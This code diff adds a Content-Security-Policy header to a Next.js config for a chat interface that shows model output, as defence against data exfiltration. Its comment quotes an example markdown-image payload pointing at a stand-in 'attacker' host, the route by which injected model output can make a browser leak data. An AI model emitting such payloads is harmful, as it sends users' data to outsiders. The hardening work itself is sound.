@@ -8,11 +8,50 @@ import type { NextConfig } from 'next';
  */
 const bffUrl = process.env.BFF_URL ?? 'http://localhost:4000';
 
+/**
+ * Content-Security-Policy, added with the conversation surface (M11) as DEFENCE
+ * IN DEPTH BEHIND THE RENDERER, not instead of it.
+ *
+ * `MessageText` already renders model output as plain text, so no `<img>` or
+ * `<a>` exists to point anywhere. This is the second line: `img-src 'self'
+ * data:` means the BROWSER refuses a remote image load even if a future
+ * renderer regresses, which closes docs/03 §6d's exfiltration channel
+ * (`![](https://attacker/?d=…)` turning the victim's browser into the outbound
+ * request) at a layer no component edit can reopen. `connect-src 'self'` keeps
+ * fetch/XHR/WebSocket on this origin, and `form-action 'self'` stops a
+ * submitted form leaving it.
+ *
+ * WHAT THIS DELIBERATELY DOES NOT DO, stated so nobody reads it as a full CSP:
+ * `script-src` allows inline, because Next's hydration bootstrap and the
+ * theme-flash script in `app/layout.tsx` are inline, and locking them down needs
+ * per-request nonces threaded through middleware. That is its own change with
+ * its own testing; claiming it here by writing a stricter directive that then
+ * gets relaxed under pressure would be worse than saying plainly that it is not
+ * done. The directives below are the ones that cost nothing today and close the
+ * channel this milestone opened.
+ */
+const csp = [
+  "default-src 'self'",
+  // The exfiltration channel docs/03 §6d names. `data:` stays for inline SVG
+  // and the vendored fonts' fallbacks; it cannot reach the network.
+  "img-src 'self' data:",
+  "connect-src 'self'",
+  "font-src 'self'",
+  "style-src 'self' 'unsafe-inline'",
+  // See the note above: NOT locked down, and deliberately not pretending to be.
+  "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
+  "frame-ancestors 'none'",
+  "form-action 'self'",
+  "base-uri 'self'",
+  "object-src 'none'",
+].join('; ');
+
 const securityHeaders = [
   { key: 'X-Content-Type-Options', value: 'nosniff' },
   { key: 'X-Frame-Options', value: 'DENY' },
   { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
   { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
+  { key: 'Content-Security-Policy', value: csp },
 ];
 
 /**
